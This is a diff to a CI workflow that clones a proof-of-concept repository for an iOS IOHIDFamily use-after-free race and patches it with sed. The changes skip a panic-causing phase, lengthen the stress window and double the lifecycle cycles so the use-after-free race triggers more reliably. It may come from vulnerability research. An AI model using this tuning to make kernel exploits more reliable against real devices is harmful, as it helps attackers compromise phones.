@@ -12,10 +12,16 @@ jobs:
       - name: Clone zeroxjf UAFPoc (proper iOS app)
         run: git clone --depth=1 https://github.com/zeroxjf/CVE-2026-28992-IOHIDFamily-FastPathUserClient-Race-Conditions.git base
 
-      - name: Patch SDK compatibility
+      - name: Patch SDK compatibility + favor UAF over AOP Panic
         run: |
           sed -i '' 's/#import <mach\/mach.h>/#import <mach\/mach.h>\ntypedef unsigned int ipc_info_object_type_t;/' base/UAFPoc/UAFPoc/ViewController.m
           sed -i '' 's/\bobjectType\b/objectAddr/g' base/UAFPoc/UAFPoc/ViewController.m 2>/dev/null || true
+          # SKIP Termination Race phase (causes AOP Panic) to favor UAF race
+          sed -i '' 's/if (raceService != MACH_PORT_NULL) {/if (0) {/' base/UAFPoc/UAFPoc/ViewController.m
+          # Increase stress window from 25s to 40s for deeper UAF race coverage
+          sed -i '' 's/kStressDuration = 25\.0/kStressDuration = 40.0/' base/UAFPoc/UAFPoc/ViewController.m
+          # Double lifecycle cycles from 2000 to 4000
+          sed -i '' 's/kLifecycleCycles = 2000/kLifecycleCycles = 4000/' base/UAFPoc/UAFPoc/ViewController.m
 
       - name: Build
         run: |
